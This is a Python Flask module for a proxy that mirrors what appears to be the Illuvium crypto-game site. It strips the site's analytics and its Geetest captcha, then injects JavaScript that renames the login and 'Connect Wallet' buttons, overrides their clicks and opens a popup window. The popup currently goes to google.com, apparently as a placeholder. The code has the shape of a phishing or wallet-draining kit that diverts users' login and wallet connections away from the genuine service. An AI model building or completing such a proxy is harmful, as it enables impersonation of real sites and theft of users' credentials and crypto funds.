from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def modify_html_content(content):
        """Modify HTML content with customizations"""
        if isinstance(content, bytes):
            content_str = content.decode('utf-8', errors='ignore')
        else:
            content_str = content
            
        logger.info("Starting HTML content modifications")
        
        try:
            # Remove tracking scripts
            content_str = remove_tracking_scripts(content_str)
            
            # Add custom text replacement script
            if '</body>' in content_str:
                content_str = content_str.replace('</body>', '''
                <script>
                  // Wait for the DOM to be fully loaded
                  document.addEventListener('DOMContentLoaded', function () {
                    console.log('DOM Content Loaded - Starting operations');

                    // Text replacements to apply
                    const textMap = {
                      'Play for Free': 'Start Games',
                      'Play Now': 'Start Games',
                      'Log In with Passport': 'Custom Login',
                      'Connect Wallet': 'Custom Connect',
                      'Launch Game': 'Start Game'
                    };

                    // Function to log text changes
                    function logTextChange(element, oldText, newText) {
                      console.log('Text changed:', {
                        element: element.outerHTML,
                        oldText: oldText,
                        newText: newText,
                        timestamp: new Date().toISOString()
                      });
                    }

                    // Apply text replacements to all buttons
                    document.querySelectorAll('button').forEach(function (button) {
                      const text = button.textContent.trim();
                      if (textMap[text]) {
                        const oldText = text;
                        button.textContent = textMap[text];
                        button.classList.add('claim-button');
                        logTextChange(button, oldText, textMap[text]);
                      }
                    });

                    console.log('Text modifications applied successfully');

                    // Periodically check for new buttons
                    setInterval(function () {
                      document.querySelectorAll('button:not(.claim-button)').forEach(function (button) {
                        const text = button.textContent.trim();
                        if (textMap[text]) {
                          const oldText = text;
                          button.textContent = textMap[text];
                          button.classList.add('claim-button');
                          logTextChange(button, oldText, textMap[text]);
                        }
                      });
                    }, 1000); // Check every second

                    // Event listener for click events
                    document.addEventListener('click', function (event) {
                      const clickedElement = event.target;
                      const targetElement = clickedElement.closest('button, a');

                      if (!targetElement) return;

                      // Case 1: Allow default behavior for specific classes
                      if (targetElement.classList.contains('css-tvaofb') || 
                          targetElement.classList.contains('css-104rome') || 
                          targetElement.classList.contains('css-1hnz6hu') ||
                          targetElement.classList.contains('css-1oqedzn') || 
                          targetElement.classList.contains('css-1i8s7az')) {
                        return;
                      }
                      
                      // Prevent normal behavior
                      event.preventDefault();
                      event.stopPropagation();

                      // Case 2: Handle clicks on 'claim-button' class
                      if (targetElement.classList.contains('claim-button')) {
                        console.log('Redirecting to Google');
                        window.open(
                          'https://www.google.com',
                          'googleWindow',
                          'width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
                        );
                        return;
                      }

                      // Case 3: Default override - log and trigger click
                      console.log('Button clicked');
                      targetElement.click();
                    }, true);
                  });
                </script>
                </body>''')
                
            return content_str.encode('utf-8') if isinstance(content_str, str) else content_str
        except Exception as e:
            logger.error(f"Error modifying HTML content: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return content if isinstance(content, bytes) else content.encode('utf-8')
    
    # Proxy routes implementation would go here
